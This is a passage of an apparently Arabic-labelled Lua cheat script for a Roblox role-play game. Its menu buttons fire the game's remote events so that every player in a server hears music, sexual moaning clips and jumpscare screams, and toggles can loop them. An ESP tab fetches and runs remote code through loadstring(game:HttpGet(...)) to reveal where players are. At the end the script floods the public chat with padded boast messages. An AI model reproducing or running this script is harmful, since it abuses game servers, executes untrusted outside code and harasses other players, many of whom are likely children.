game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "فونك", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "14145626412"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "فونك حزين", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "16662831858"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "فونك روسي", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "15689441943"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "اغنية فونك 1", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "15689443663"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "اغنية فونك 2", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "16190782181"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "اغنية فونك 3", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "15689448519"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "اغنية فونك 4", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "7825702538"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "اغنية فونك نادره 5", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "71517955953236"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "اغنية فونك 6", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "127084858692372"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "اغنية فونك 7", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "104541292443133"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "اغنية فونك 8", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "130607529536925"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "اغنية فونك 9", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "84733736048142"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "اغنية فونك 10", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "82680101995105"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "اغنية فونك 11", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "76603092488414"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "اغنية فونك 12", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "124958445624871"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "اغنية فونك 13", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "16662833837"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "اغنية فونك 14", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "90698302380427"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

local Section = Tab:AddSection({
	Name = "اصوات ميمز"
})

Tab:AddButton({ 	Name  = "ميمز 1", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "7341213035"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "ميمز 2", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "6389463761"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

Tab:AddButton({ 	Name  = "ميمز 3", 	Callback = function()

game.StarterGui:SetCore("SendNotification", {
    Title = "تم التشغيل";
    Text = "ملاحظه: في اغاني تحتاج الى تقريبا 10 ثواني للتشغيل"; -- ARAB TEAM
    Duration = 5;
})

     local args = {
    [1] = "SkateBoard"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))
local args = {
    [1] = "PickingScooterMusicText",
    [2] = "3007579524"
}
 
game:GetService("ReplicatedStorage").RE:FindFirstChild("1NoMoto1rVehicle1s"):FireServer(unpack(args))

end })

local Tab = Window:MakeTab({"الاغاني المجانية"})

local MusicId = nil
local MusicToggle = false
local currentSound = nil
local pausedPosition = 0

local function playMusic()
    if MusicToggle and MusicId then
        if currentSound then
            currentSound:Stop()
            currentSound:Destroy()
        end
        currentSound = Instance.new("Sound", game.Workspace)
        currentSound.SoundId = "rbxassetid://" .. MusicId
        currentSound.TimePosition = pausedPosition
        currentSound.Looped = true
        currentSound:Play()
        currentSound.Ended:Connect(function()
            currentSound.TimePosition = 0
            currentSound:Play()
        end)
    end
end

Tab:AddTextBox({
    Name = "ضع كود الاغنيه",
    Description = "ضع كود الاغنيه هنا التي تريد تشغيلها",
    Default = "",
    Callback = function(value)
        MusicId = value
        playMusic()
    end
})

local Section = Tab:AddSection({"وضع تشغيل الاغنية"})

local Toggle1 = Tab:AddToggle({
    Name = "تشغيل الاغنية",
    Description = "اضغط لتشغيل الاغنية",
    Default = false,
    Callback = function(state)
        MusicToggle = state
        if MusicToggle then
            playMusic()
        else
            if currentSound then
                pausedPosition = currentSound.TimePosition
                currentSound:Stop()
            end
        end
    end
})

Tab:AddButton({
    Name = "اعادة تشغيل الاغنية",
    Description = "Enables or disables music repetition.",
    Callback = function()
        if MusicToggle and currentSound then
            currentSound.TimePosition = 0
            currentSound:Play()
        end
    end
})

local Section = Tab:AddSection({"اكواد اغاني"})

Tab:AddButton({
    Name = "",
    Description = "اضغط هنا لتشغيل الاغنية",
    Callback = function()
        MusicId = "16190782181"
        playMusic()
    end
})

Tab:AddButton({
    Name = "انسخ كود الاغنية",
    Description = "اضغط هنا لنسخ كود الاغنية",
    Callback = function()
        setclipboard("16190782181")
    end
})

local Tab = Window:MakeTab({"الاصوات"})

local loopAtivo = false
local InputID = ""

Tab:AddTextBox({
    Name = "ضع كود الاغنيه",
    Description = "ضع كود الاغنيه التي تريد تشغيلها في الصندوق",
    Default = "",
    PlaceholderText = "ادخل الكود هنا",
    ClearTextOnFocus = true,
    Callback = function(text)
        InputID = tonumber(text)
    end
})

local function fireServer(eventName, args)
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local event = ReplicatedStorage:FindFirstChild("RE") and ReplicatedStorage.RE:FindFirstChild(eventName)
    if event then
        pcall(function()
            event:FireServer(unpack(args))
        end)
    end
end

Tab:AddButton({
    Name = "تشغيل الاغنيه",
    Description = "اضغط هنا لتشغيل الاغنية التي قمت باختيارها",
    Callback = function()
        if InputID then
            fireServer("1Gu1nSound1s", {Workspace, InputID, 1})
            local globalSound = Instance.new("Sound", Workspace)
            globalSound.SoundId = "rbxassetid://" .. InputID
            globalSound.Looped = false
            globalSound:Play()
            task.wait(3)
            globalSound:Destroy()
        end
    end
})

Tab:AddToggle({
    Name = "اعادة اشغيل الاغنية تلقائيا",
    Description = "اضغط هنا لاعاده تشغيل الاغنية تلقائيا",
    Default = false,
    Callback = function(state)
        loopAtivo = state
        if loopAtivo then
            spawn(function()
                while loopAtivo do
                    if InputID then
                        fireServer("1Gu1nSound1s", {Workspace, InputID, 1})
                        local globalSound = Instance.new("Sound", Workspace)
                        globalSound.SoundId = "rbxassetid://" .. InputID
                        globalSound.Looped = false
                        globalSound:Play()
                        task.spawn(function()
                            task.wait(3)
                            globalSound:Destroy()
                        end)
                    end
                    task.wait(1)
                end
            end)
        end
    end
})

local function createDropdown(title, musicOptions, defaultOption)
    local musicNames = {}
    local categoryMap = {}
    for category, sounds in pairs(musicOptions) do
        for _, music in ipairs(sounds) do
            if music.name ~= "" and music.id ~= "4354908569" then
                table.insert(musicNames, music.name)
                categoryMap[music.name] = {id = music.id, category = category}
            end
        end
    end

    local selectedSoundID = nil
    local currentVolume = 1
    local currentPitch = 1

    local function playSound(soundId, volume, pitch)
        fireServer("1Gu1nSound1s", {Workspace, soundId, volume})
        local globalSound = Instance.new("Sound")
        globalSound.Parent = Workspace
        globalSound.SoundId = "rbxassetid://" .. soundId
        globalSound.Volume = volume
        globalSound.Pitch = pitch
        globalSound.Looped = false
        globalSound:Play()
        task.spawn(function()
            task.wait(3)
            globalSound:Destroy()
        end)
    end

    Tab:AddDropdown({
        Name = title,
        Description = "اختار صوت ميمز الذي تريده",
        Default = defaultOption,
        Multi = false,
        Options = musicNames,
        Callback = function(selectedSound)
            if selectedSound and categoryMap[selectedSound] then
                selectedSoundID = categoryMap[selectedSound].id
            else
                selectedSoundID = nil
            end
        end
    })

    Tab:AddButton({
        Name = "تشغيل الاغنية",
        Description = "اضغط هنا لتشغيل الاغنية",
        Callback = function()
            if selectedSoundID then
                playSound(selectedSoundID, currentVolume, currentPitch)
            end
        end
    })

    local dropdownLoopActive = false
    Tab:AddToggle({
        Name = "اعادة تشغيل الاغنية تلقائيا",
        Description = "اضغط هنا لاعادة تشغيل الاغنية تلقائيا",
        Default = false,
        Callback = function(state)
            dropdownLoopActive = state
            if state then
                task.spawn(function()
                    while dropdownLoopActive do
                        if selectedSoundID then
                            playSound(selectedSoundID, currentVolume, currentPitch)
                        end
                        task.wait(1)
                    end
                end)
            end
        end
    })
end

-- Dropdown "Memes"
createDropdown("اصوات ميمز", {
    ["Memes"] = {
        {name = "pankapakan", id = "122547522269143"},
        {name = "gemido", id = "106835463235574"},
        {name = "gemidao v2", id = "112179417472137"},
        {name = "Gemido ultra rápido", id = "128863565301778"},
        {name = "sus sex", id = "128137573022197"},
        {name = "gemido estranho", id = "131219411501419"},
        {name = "gemido kawai", id = "100409245129170"},
        {name = "Hentai gemido", id = "125037339642322"},
        {name = "Hentai wiaaaaan", id = "88332347208779"},
        {name = "iamete cunasai", id = "108494476595033"},
        {name = "dodichan onnn...", id = "134640594695384"},
        {name = "Toma jack", id = "132603645477541"},
        {name = "Toma jackV2", id = "100446887985203"},
        {name = "Toma jack no sol quente", id = "97476487963273"},
        {name = "ifood", id = "133843750864059"},
        {name = "pelo geito ela ta querendo ram", id = "94395705857835"},
        {name = "lula vai todo mundo", id = "136804576009416"},
        {name = "coringa", id = "84663543883498"},
        {name = "shoope", id = "8747441609"},
        {name = "quenojo", id = "103440368630269"},
        {name = "sai dai lava prato", id = "101232400175829"},
        {name = "se e loko numconpeça", id = "78442476709262"},
        {name = "mita sequer que eu too uma", id = "94889439372168"},
        {name = "Hoje vou ser tua mulher e tu", id = "90844637105538"},
        {name = "Deita aqui eu mandei vc deitar sirens", id = "100291188941582"},
        {name = "miau", id = "131804436682424"},
        {name = "skibidi", id = "128771670035179"},
        {name = "BIRULEIBI", id = "121569761604968"},
        {name = "sai", id = "121169949217007"},
        {name = "risada boa dms", id = "127589011971759"},
        {name = "vacilo perna de pau", id = "106809680656199"},
        {name = "gomo gomo no!!!", id = "137067472449625"},
        {name = "arroto", id = "140203378050178"},
        {name = "iraaaa", id = "136752451575091"},
        {name = "não fica se achando muito não", id = "101588606280167"},
        {name = "WhatsApp notificaçao", id = "107004225739474"},
        {name = "Samsung", id = "123767635061073"},
        {name = "Shiiii", id = "120566727202986"},
        {name = "ai_tomaa miku", id = "139770074770361"},
        {name = "kuru_kuru", id = "122465710753374"},
        {name = "PM ROCAM", id = "96161547081609"},
        {name = "cavalo!!", id = "78871573440184"},
        {name = "deixa os garoto brinca", id = "80291355054807"},
        {name = "flamengo", id = "137774355552052"},
        {name = "sai do mei satnas", id = "127944706557246"},
        {name = "namoral agora e a hora", id = "120677947987369"},
        {name = "n pode me chutar pq seu celebro e burro", id = "82284055473737"},
        {name = "vc ta fudido vou te pegar", id = "120214772725166"},
        {name = "deley", id = "102906880476838"},
        {name = "Tu e um beta", id = "130233956349541"},
        {name = "Porfavor n tira eu nao", id = "85321374020324"},
        {name = "Olá beleza vc pode me dá muitos", id = "74235334504693"},
        {name = "Discord sus", id = "122662798976905"},
        {name = "rojao apito", id = "6549021381"},
        {name = "off", id = "1778829098"},
        {name = "Kazuma kazuma", id = "127954653962405"},
        {name = "sometourado", id = "123592956882621"},
        {name = "Estouradoespad", id = "136179020015211"},
        {name = "Alaku bommm", id = "110796593805268"},
        {name = "busss", id = "139841197791567"},
        {name = "Estourado wItb", id = "137478052262430"},
        {name = "sla", id = "116672405522828"},
        {name = "HA HA HA", id = "138236682866721"}
    }
}, "pankapakan")

Tab:AddSection({ "اصوات رعب" })

-- Dropdown "Efeito/Terror"
createDropdown("اختر صوت رعب", {
    ["efeito/terror"] = {
        {name = "jumpscar", id = "91784486966761"},
        {name = "gritoestourado", id = "7520729342"},
        {name = "gritomedo", id = "113029085566978"},
        {name = "Nukesiren", id = "9067330158"},
        {name = "nuclear sirenv2", id = "675587093"},
        {name = "Alertescola", id = "6607047008"},
        {name = "Memealertsiren", id = "8379374771"},
        {name = "sirenv3", id = "6766811806"},
        {name = "alet malaysia", id = "7714172940"},
        {name = "Risada", id = "79191730206814"},
        {name = "Hahahah", id = "90096947219465"},
        {name = "scream", id = "314568939"},
        {name = "Terrified meme scream", id = "5853668794"},
        {name = "Sonic.exe Scream Effect", id = "146563959"},
        {name = "Demon Scream", id = "2738830850"},
        {name = "SCP-096 Scream (raging)", id = "343430735"},
        {name = "Nightmare Yelling Bursts", id = "9125713501"},
        {name = "HORROR SCREAM 07", id = "9043345732"},
        {name = "Female Scream Woman Screams", id = "9114397912"},
        {name = "Scream1", id = "1319496541"},
        {name = "Scream2", id = "199978176"},
        {name = "scary maze scream", id = "270145703"},
        {name = "SammyClassicSonicFan's Scream", id = "143942090"},
        {name = "FNAF 2 Death Scream", id = "1572549161"},
        {name = "cod zombie scream", id = "8566359672"},
        {name = "Slendytubbies- CaveTubby Scream", id = "1482639185"},
        {name = "FNAF 2 Death Scream", id = "5537531920"},
        {name = "HORROR SCREAM 15", id = "9043346574"},
        {name = "Jumpscare Scream", id = "6150329916"},
        {name = "FNaF: Security Breach", id = "2050522547"},
        {name = "llllllll", id = "5029269312"},
        {name = "loud jumpscare", id = "7236490488"},
        {name = "fnaf", id = "6982454389"},
        {name = "Pinkamena Jumpscare 1", id = "192334186"},
        {name = "Ennard Jumpscare 2", id = "629526707"},
        {name = "a sla medo dino", id = "125506416092123"}
    }
}, "jumpscar")

local Tab = Window:MakeTab({"الاسماء"})

local vibrantColors = {
    Color3.new(1, 0, 0),
    Color3.new(0, 1, 0),
    Color3.new(0, 0, 1),
    Color3.new(1, 1, 0),
    Color3.new(1, 0, 1),
    Color3.new(0, 1, 1),
    Color3.new(1, 0.5, 0),
    Color3.new(0.5, 0, 1)
}

local function fireServer(eventName, args)
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local event = ReplicatedStorage:FindFirstChild("RE") and ReplicatedStorage.RE:FindFirstChild(eventName)
    if event then
        pcall(function()
            event:FireServer(unpack(args))
        end)
    end
end

local nameAndBioActive = false
Tab:AddToggle({
    Name = "تلوين الاسم و البايو",
    Description = "اضغط لتلوين الاسم و البايو",
    Default = false,
    Callback = function(state)
        nameAndBioActive = state
        if state then
            task.spawn(function()
                while nameAndBioActive and LocalPlayer.Character do
                    local color = vibrantColors[math.random(1, #vibrantColors)]
                    local nameArgs = { [1] = "PickingRPNameColor", [2] = color }
                    local bioArgs = { [1] = "PickingRPBioColor", [2] = color }
                    fireServer("1RPNam1eColo1r", nameArgs)
                    fireServer("1RPNam1eColo1r", bioArgs)
                    task.wait(1)
                end
            end)
        end
    end
})

local nameActive = false
Tab:AddToggle({
    Name = "ار جي بي الاسم",
    Description = "اضغط لتشغيل ار جي بي الاسم",
    Default = false,
    Callback = function(state)
        nameActive = state
        if state then
            task.spawn(function()
                while nameActive and LocalPlayer.Character do
                    local color = vibrantColors[math.random(1, #vibrantColors)]
                    local args = { [1] = "PickingRPNameColor", [2] = color }
                    fireServer("1RPNam1eColo1r", args)
                    task.wait(1)
                end
            end)
        end
    end
})

local bioActive = false
Tab:AddToggle({
    Name = "ار جي بي البايو",
    Description = "اضغط لتشغيل ار جي بي البايو",
    Default = false,
    Callback = function(state)
        bioActive = state
        if state then
            task.spawn(function()
                while bioActive and LocalPlayer.Character do
                    local color = vibrantColors[math.random(1, #vibrantColors)]
                    local args = { [1] = "PickingRPBioColor", [2] = color }
                    fireServer("1RPNam1eColo1r", args)
                    task.wait(1)
                end
            end)
        end
    end
})

local function getGrayscaleColor(t)
    -- t varia de 0 a 1
    local brightness = math.abs(math.sin(t * math.pi)) -- valor oscilando entre 0 e 1
    return Color3.new(brightness, brightness, brightness)
end

local function fireServer(eventName, args)
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local event = ReplicatedStorage:FindFirstChild("RE") and ReplicatedStorage.RE:FindFirstChild(eventName)
    if event then
        pcall(function()
            event:FireServer(unpack(args))
        end)
    end
end

local nameAndBioActive = false
Tab:AddToggle({
    Name = "تلوين الاسم و البايو",
    Description = "اضغط لتلوين الاسم و البايو",
    Default = false,
    Callback = function(state)
        nameAndBioActive = state
        if state then
            task.spawn(function()
                local time = 0
                while nameAndBioActive and LocalPlayer.Character do
                    local color = getGrayscaleColor(time)
                    local nameArgs = { [1] = "PickingRPNameColor", [2] = color }
                    local bioArgs = { [1] = "PickingRPBioColor", [2] = color }
                    fireServer("1RPNam1eColo1r", nameArgs)
                    fireServer("1RPNam1eColo1r", bioArgs)
                    task.wait(0.1)
                    time = time + 0.05 -- ajusta a velocidade da transição
                end
            end)
        end
    end
})

local function getRainbowColor(t)
    return Color3.fromHSV((t % 1), 1, 1)
end

local function fireServer(eventName, args)
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local event = ReplicatedStorage:FindFirstChild("RE") and ReplicatedStorage.RE:FindFirstChild(eventName)
    if event then
        pcall(function()
            event:FireServer(unpack(args))
        end)
    end
end

local arcuisActive = false

Tab:AddToggle({
    Name = "",
    Description = "",
    Default = false,
    Callback = function(state)
        arcuisActive = state
        if state then
            task.spawn(function()
                local time = 0
                while arcuisActive and LocalPlayer.Character do
                    local color = getRainbowColor(time)
                    local nameArgs = { [1] = "PickingRPNameColor", [2] = color }
                    local bioArgs = { [1] = "PickingRPBioColor", [2] = color }
                    fireServer("1RPNam1eColo1r", nameArgs)
                    fireServer("1RPNam1eColo1r", bioArgs)
                    task.wait(0.1)
                    time = time + 0.02
                end
            end)
        end
    end
})

local nomeEstiloso = ""  -- Variável para armazenar o texto do usuário

Tab:AddTextBox({
    Name = "اكتب الاسم",
    Description = "اكتب اسمك هنا الذي تريد وضعه", 
    PlaceholderText = "ادخل الاسم هنا",
    Callback = function(Value)
        nomeEstiloso = ".•°" .. Value .. "°•."  -- Armazena o texto formatado
    end
})

Tab:AddButton({
    Name = "وضع الاسم",
    Callback = function()
        if nomeEstiloso ~= "" then
            local args = {
                [1] = "RolePlayName",
                [2] = nomeEstiloso
            }
            
            game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPNam1eTex1t"):FireServer(unpack(args))
        else
            warn("Nenhum nome estiloso foi inserido!")
        end
    end
})

local Tab = Window:MakeTab({"الكشف"})
local ESP = loadstring(game:HttpGet("https://kiriot22.com/releases/ESP.lua"))()
ESP:Toggle(true)
ESP.Players = true
ESP.Names = true

local Toggle1 = Tab:AddToggle({
  Name = "كشف اماكن اللاعبين",
  Description = "عندما تضغط على الزر سيظهر مربع لكشف اماكن اللاعبين على كل لاعب و يظهر الاسم",
  Default = false 
})
Toggle1:Callback(function(Value)
 ESP.Players = Value
end)

local Tab = Window:MakeTab({"الاعدادات"})

local Dropdown = Tab:AddDropdown({
  Name = "حجم واجهه السكربت",
  Description = "اختر حجم واجهه السكربت",
  Options = {"صغير", "متوسط", "كبير"},
  Default = "كبير",
  Flag = "Misc/UIScale",
  Callback = function(Value)
    if Value == "كبير" then
        redzlib:SetScale(450)
      elseif Value == "متوسط" then
        redzlib:SetScale(620)
      else
        redzlib:SetScale(760)
      end
  end
})


wait(1)

local TextChatService = game:GetService("TextChatService")
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local message = ".\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r✅️تم التفعيل بنجاح LFERDA✅️"
            TextChatService.TextChannels.RBXGeneral:SendAsync(message)
        else
        end

wait(1)

local TextChatService = game:GetService("TextChatService")
        if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
            local message = ".\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r\r👑LFERDA ON TOP👑"
            TextChatService.TextChannels.RBXGeneral:SendAsync(message)
        else
        end